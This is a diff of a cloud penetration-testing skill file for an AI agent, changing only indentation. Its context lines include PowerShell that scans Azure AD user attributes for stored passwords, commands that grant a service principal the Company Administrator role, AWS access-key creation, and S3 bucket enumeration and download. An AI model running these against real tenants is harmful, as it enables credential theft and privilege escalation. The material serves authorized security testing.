@@ -2,8 +2,8 @@
 name: Cloud Penetration Testing
 description: This skill should be used when the user asks to "perform cloud penetration testing", "assess Azure or AWS or GCP security", "enumerate cloud resources", "exploit cloud misconfigurations", "test O365 security", "extract secrets from cloud environments", or "audit cloud infrastructure". It provides comprehensive techniques for security assessment across major cloud platforms.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # Cloud Penetration Testing
@@ -148,13 +148,13 @@ Exploit Azure misconfigurations:
 # Search user attributes for passwords
 $users = Get-MsolUser -All
 foreach($user in $users){
-    $props = @()
-    $user | Get-Member | foreach-object{$props+=$_.Name}
-    foreach($prop in $props){
-        if($user.$prop -like "*password*"){
-            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
-        }
-    }
+ $props = @()
+ $user | Get-Member | foreach-object{$props+=$_.Name}
+ foreach($prop in $props){
+ if($user.$prop -like "*password*"){
+ Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
+ }
+ }
 }
 
 # Execute commands on VMs
@@ -187,7 +187,7 @@ $role = Get-MsolRole -RoleName "Company Administrator"
 Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
 
 # Login as service principal
-$cred = Get-Credential  # AppID as username, secret as password
+$cred = Get-Credential # AppID as username, secret as password
 Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal
 
 # Create new admin user via CLI
@@ -279,7 +279,7 @@ aws iam create-access-key --user-name <username>
 
 # Get all EC2 public IPs
 for region in $(cat regions.txt); do
-    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
+ aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
 done
 ```
 
@@ -458,8 +458,8 @@ aws s3 ls | awk '{print $3}' > buckets.txt
 
 # Check each bucket for contents
 while read bucket; do
-    echo "Checking: $bucket"
-    aws s3 ls s3://$bucket 2>/dev/null
+ echo "Checking: $bucket"
+ aws s3 ls s3://$bucket 2>/dev/null
 done < buckets.txt
 
 # Download interesting bucket
